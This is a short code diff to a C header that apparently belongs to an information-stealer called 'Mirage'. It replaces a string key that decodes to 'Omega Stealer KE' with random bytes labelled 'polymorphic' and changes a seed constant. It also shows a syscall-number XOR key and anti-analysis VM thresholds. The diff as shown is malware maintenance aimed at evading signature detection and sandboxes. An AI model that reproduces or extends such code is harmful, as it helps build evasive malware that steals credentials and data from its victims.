@@ -10,14 +10,12 @@
 
 /* ═══════ Crypto Constants ═══════════════════════════════════════ */
 
-#define MIRAGE_SEED            0x61472f96
+#define MIRAGE_SEED            0xAA870885
 #define MIRAGE_SSN_XOR_KEY     0xA3B5C7D9
 
 static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
-    0x4f, 0x6d, 0x65, 0x67, 0x61, 0x20, 0x53, 0x74,  /* "Omega St" */
-    0x65, 0x61, 0x6c, 0x65, 0x72, 0x20, 0x4b, 0x45   /* "ealer KE" */
+    0xd6, 0x26, 0xe9, 0xcd, 0xfe, 0xc0, 0x8d, 0xd5, 0x0c, 0x24, 0x57, 0x0f, 0xb2, 0x7b, 0x9a, 0xe7   /* polymorphic */
 };
-
 /* ═══════ Anti-Analysis Thresholds ═══════════════════════════════ */
 
 #define VM_MIN_RAM               (4ULL * 1024 * 1024 * 1024)  /* 4 GB */
